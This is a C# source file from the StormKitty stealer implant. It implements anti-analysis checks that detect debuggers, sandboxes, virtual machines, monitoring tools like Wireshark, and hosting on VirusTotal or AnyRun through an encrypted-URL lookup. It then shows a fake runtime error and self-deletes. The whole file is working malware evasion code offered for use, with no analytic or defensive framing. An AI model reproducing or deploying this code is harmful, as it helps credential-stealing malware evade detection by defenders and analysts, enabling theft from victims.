// https://github.com/LimerBoy/AntiAnalysis
using System;
using System.Linq;
using System.Management;
using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;

namespace StormKitty.Implant // Анальный
{
    internal sealed class AntiAnalysis
    {
        // CheckRemoteDebuggerPresent (Detect debugger)
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        private static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent);
        // GetModuleHandle (Detect SandBox)
        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(string lpModuleName);


        /// <summary>
        /// Returns true if the file is running in debugger; otherwise returns false
        /// </summary>
        private static bool Debugger()
        {
            bool isDebuggerPresent = false;
            try
            {
                CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref isDebuggerPresent);
                return isDebuggerPresent;
            } catch { }
            return isDebuggerPresent;
        }

        /// <summary>
        /// Returns true if the file is running in emulator; otherwise returns false
        /// </summary>
        private static bool Emulator()
        {
            try
            {
                long ticks = DateTime.Now.Ticks;
                System.Threading.Thread.Sleep(10);
                if (DateTime.Now.Ticks - ticks < 10L)
                    return true;
            }
            catch { }
            return false;
        }

        /// <summary>
        /// Returns true if the file is running on the server (VirusTotal, AnyRun); otherwise returns false
        /// </summary>
        private static bool Hosting()
        {
            try
            {
                string status = new System.Net.WebClient()
                    .DownloadString(
                     StringsCrypt.Decrypt(new byte[] { 150, 74, 225, 199, 246, 42, 22, 12, 92, 2, 165, 125, 115, 20, 210, 212, 231, 87, 111, 21, 89, 98, 65, 247, 202, 71, 238, 24, 143, 201, 231, 207, 181, 18, 199, 100, 99, 153, 55, 114, 55, 39, 135, 191, 144, 26, 106, 93, }));
                return status.Contains("true");
            } catch { }
            return false;
        }

        /// <summary>
        /// Returns true if a process is started from the list; otherwise, returns false
        /// </summary>
        private static bool Processes()
        {
            Process[] running_process_list = Process.GetProcesses();
            string[] selected_process_list = new string[] {
                "processhacker",
                "netstat", "netmon", "tcpview", "wireshark",
                "filemon", "regmon", "cain"
            };
            foreach (Process process in running_process_list)
                if (selected_process_list.Contains(process.ProcessName.ToLower()))
                    return true;
            return false;
        }

        /// <summary>
        /// Returns true if the file is running in sandbox; otherwise returns false
        /// </summary>
        private static bool SandBox()
        {
            string[] dlls = new string[5]
            {
                "SbieDll.dll",
                "SxIn.dll",
                "Sf2.dll",
                "snxhk.dll",
                "cmdvrt32.dll"
            };
            foreach (string dll in dlls)
                if (GetModuleHandle(dll).ToInt32() != 0)
                    return true;
            return false;
        }

        /// <summary>
        /// Returns true if the file is running in VirtualBox or VmWare; otherwise returns false
        /// </summary>
        private static bool VirtualBox()
        {
            using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
            {
                try
                {
                    using (ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get())
                        foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
                            if ((managementBaseObject["Manufacturer"].ToString().ToLower() == "microsoft corporation" && managementBaseObject["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL")) || managementBaseObject["Manufacturer"].ToString().ToLower().Contains("vmware") || managementBaseObject["Model"].ToString() == "VirtualBox")
                                return true;

                }
                catch { return true; }
            }
            foreach (ManagementBaseObject managementBaseObject2 in new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController").Get())
                if (managementBaseObject2.GetPropertyValue("Name").ToString().Contains("VMware") && managementBaseObject2.GetPropertyValue("Name").ToString().Contains("VBox"))
                    return true;
            return false;
        }

        /// <summary>
        /// Detect virtual enviroment
        /// </summary>
        public static bool Run()
        {
            if (Config.AntiAnalysis == "1")
            {
                if (Hosting()) return true;
                if (Processes()) return true;
                if (VirtualBox()) return true;
                if (SandBox()) return true;
                if (Emulator()) return true;
                if (Debugger()) return true;
            }
            return false;
        }

        /// <summary>
        /// Run fake error message and self destruct
        /// </summary>
        public static void FakeErrorMessage()
        {
            string code = StringsCrypt.GenerateRandomData("1");
            code = "0x" + code.Substring(0, 5);
            MessageBox.Show("Exit code " + code, "Runtime error",
                MessageBoxButtons.RetryCancel, MessageBoxIcon.Error);
            SelfDestruct.Melt();
        }

    }
}
